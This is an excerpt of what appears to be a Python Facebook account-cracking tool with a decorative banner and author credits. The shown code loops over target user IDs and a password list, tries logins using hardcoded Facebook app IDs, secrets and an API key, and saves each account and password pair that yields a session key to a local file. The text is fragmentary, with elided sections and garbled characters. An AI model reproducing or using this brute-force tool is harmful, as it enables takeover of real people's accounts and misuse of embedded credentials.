#Codeld by Baloch . Nadeem by Saif Khan
...
▀▀█████▄    ▀▀███▀▀▀▀███▀  ▀███████████ ███   ███ 
 ...
 [â1¢] Khan     : '\033[91;1m'KhanðŸ‘‘\033[1;37m 
 [â2¢] GITHUB     : '\x1b[0m'Khan-XDðŸ‘‘\033[1;37m 
 [â3¢] TOOL NAME  :'\033[96;1m'ðŸ¤—\033[1;37m 
 [â4¢] TOOL Khan  :'\033[94;1m'Khan\033[1;37m 
 [â5¢] STATUSES     : '\033[93;1m'C.S.KhanðŸ‘‘ðŸ¤ \033[1;37m 
 ...
 Ads Saif Khan : 438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28 
 Facebook Khan : 350685531728|62f8ce9f74b12f84c123cc23437a4a32 
 ...
 def method(): 
     ...
     def start(user): 
      try: 
         ...
         sys.stdout.write(f'\r {R}[{W}KILLER{R}] {P}({Y}{loop}{W} / {W}{len(idx)}{P}) {W}â€¢ {G}{len(oku)}\r') 
         sys.stdout.flush() 
         loop+=1 
         for pswd in pp: 
     ...
     "api_key": "882a8490361da98702bf97a021ddc14d", 
               ...
               if "session_key" in response: 
                 ...
                 open('/sdcFrd/Khan -SP.txt','a').write(f'{acc}|{pswd}\n') 
                 break 
               else: 
                    continue    
